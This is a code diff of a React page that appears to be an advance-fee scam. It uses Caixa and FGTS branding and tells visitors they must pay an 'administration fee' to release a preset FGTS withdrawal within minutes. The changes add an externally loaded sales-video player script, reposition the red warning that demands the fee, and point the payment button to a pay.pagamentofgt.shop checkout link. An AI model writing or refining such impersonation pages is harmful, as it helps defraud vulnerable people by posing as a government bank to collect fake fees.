@@ -4,12 +4,12 @@ import logofgts from "../assets/fgts2.png";
 // import caixa from "../assets/logo.png";
 import pix from "../assets/pix.png";
 import { IoIosWarning } from "react-icons/io";
-import Vimeo from '@u-wave/react-vimeo';
 import { UserData } from "../types/userData";
 import cartao from "../assets/cartao.png"
 // import box from "../assets/carro.png"
 // import carrinho from "../assets/carrinho.png"
 import logocaixa from "../assets/caixalogo.png"
+import { Helmet } from "react-helmet";
 // import flogo from "../assets/f-logo.png"
 // import { BiDownArrowAlt } from "react-icons/bi";
 
@@ -17,7 +17,7 @@ import logocaixa from "../assets/caixalogo.png"
 
 
 export function PagamentoTarifa() {
-    const [displayedAmount, setDisplayedAmount] = useState(0);
+    const [, setDisplayedAmount] = useState(0);
     const saqueTotal = 1739.70;
 
     const [, setIsVisible] = useState(false);
@@ -123,11 +123,20 @@ export function PagamentoTarifa() {
 
                 <h3 className="text-2xl text-zinc-500">Basta pagar a taxa de administração Caixa que seu dinheiro cairá em até 3 minutos.</h3>
 
-                <Vimeo
-                    video="1043682607"
-                    autoplay
-                    width={380}
-                />
+                <div className="w-full p-1">
+                    <div dangerouslySetInnerHTML={{ __html: '<div id="vid_678f03080cb4342a3c105bfc" style="position: relative; width: 100%; padding: 56.25% 0 0;"> <img id="thumb_678f03080cb4342a3c105bfc" src="https://images.converteai.net/19e779a9-9bff-4dff-b541-9918122b88f8/players/678f03080cb4342a3c105bfc/thumbnail.jpg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: block;" alt="thumbnail"> <div id="backdrop_678f03080cb4342a3c105bfc" style=" -webkit-backdrop-filter: blur(5px); backdrop-filter: blur(5px); position: absolute; top: 0; height: 100%; width: 100%; "></div> </div> ' }} />
+                    <Helmet>
+                        <script type="text/javascript" id="scr_678f03080cb4342a3c105bfc"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/19e779a9-9bff-4dff-b541-9918122b88f8/players/678f03080cb4342a3c105bfc/player.js", s.async=!0,document.head.appendChild(s); </script>
+                    </Helmet>
+                </div>
+
+
+                <div className=" flex items-center space-x-2">
+                    <div className="h-full">
+                        <IoIosWarning className="text-red-500 text-6xl" />
+                    </div>
+                    <div className="text-red-600 text-2xl text-left">É PRECISO PAGAR A<span className="font-bold"> TAXA DE ADMINISTRAÇÃO</span> PARA <span className="">SACAR SEU FGTS</span></div>
+                </div>
 
                 <div>
                     <div className="flex flex-col items-center justify-center space-x-1">
@@ -154,12 +163,7 @@ export function PagamentoTarifa() {
                 </div>
 
 
-                <div className=" flex items-center space-x-2">
-                    <div className="h-full">
-                        <IoIosWarning className="text-red-500 text-6xl" />
-                    </div>
-                    <div className="text-red-600 text-2xl">É PRECISO PAGAR A<span className="font-bold"> TAXA DE ADMINISTRAÇÃO</span> PARA <span className="">SACAR SEU FGTS</span></div>
-                </div>
+
 
 
                 {/* <span className="text-4xl font-bold text-gray-800">ASSISTA O VÍDEO PARA ENTENDER</span> */}
@@ -171,13 +175,13 @@ export function PagamentoTarifa() {
 
 
                 {/* Informações sobre o saque disponível */}
-                <div className="">
+                {/* <div className="">
                     <p className="text-xl mb-2 text-gray-500 my-2">Valor disponível para saque:</p>
                     <p className="text-6xl font-semibold text-green-600">R$ {displayedAmount.toFixed(2)}</p>
-                </div>
+                </div> */}
 
                 <a
-                    href="https://pay.iexperience-app.com/f31d1b15"
+                    href="https://pay.pagamentofgt.shop/KV603k01qyEZw8y"
                     className="w-full iexperience-upsell"
                 >
                     <button className="bg-green-500 w-full hover:bg-green-600 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 animate-bounce mt-3 text-2xl">
